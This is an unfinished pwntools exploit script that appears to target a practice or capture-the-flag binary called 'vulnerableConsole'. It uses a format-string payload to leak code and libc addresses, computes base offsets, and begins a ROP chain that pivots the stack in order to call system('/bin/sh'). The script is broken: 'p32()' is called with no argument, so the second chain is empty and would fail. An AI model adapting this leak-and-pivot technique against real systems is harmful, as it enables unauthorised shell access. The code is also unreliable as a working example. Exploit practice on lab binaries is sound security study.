from pwn import *
fileName = './vulnerableConsole'
context.binary = fileName
e = ELF(fileName)

## .got + .sym + .plt are all valid methods to get an address
#putsAdd = e.got['puts']

## to test locally use proccess, otherwise remote in
#p = process(fileName)
context.terminal = ['ptyxis', '--', 'sh', '-c']
p = gdb.debug(fileName, gdbscript='''r''',env={"SHELL": "/bin/sh"})
#p = remote(ip,port)

#line = "lalala"
#p.sendline(line)
#p.sendline(p64(line))

# 6%p = description leak 7%p = libc leak
p.recvuntil(b'Exit\n')
p.sendline(b'settings uptime %6$p %7$p')
p.sendline(b'info uptime\n')
p.recvuntil(b'updated.\n> ')
leaks = p.recvline().decode()
leakedAddresses = leaks.split()
descriptionLeak = leakedAddresses[0]
libcLeak = leakedAddresses[1].partition('>')[0] # removes that >
print(f"Desc leak = {descriptionLeak} libcLeak = {libcLeak}")
stdinOffset = 0x1F75C0
descriptionOffset = 0x3020
libcBase = int(libcLeak,16) - stdinOffset
codeBase = int(descriptionLeak,16) - descriptionOffset
print(f"Libc base = {hex(libcBase)}")
print(f"Code base = {hex(codeBase)}")

# First rop chain on with sprintf needs to pivot stack pointer to description buffer, then second rop chain to call system with /bin/sh
# We need to build the second rop chain first
secondRopChain = b'settings description'
secondRopChain += p32()



p.sendline(secondRopChain)

# Now the first small rop chain to go to the second rop chain, stack pivot
p.sendline(b'query AAAAAAAABBBBBBBBCCCCC' + p32(int(descriptionLeak,16)) + p32(codeBase+0x00000331-4))







p.interactive()
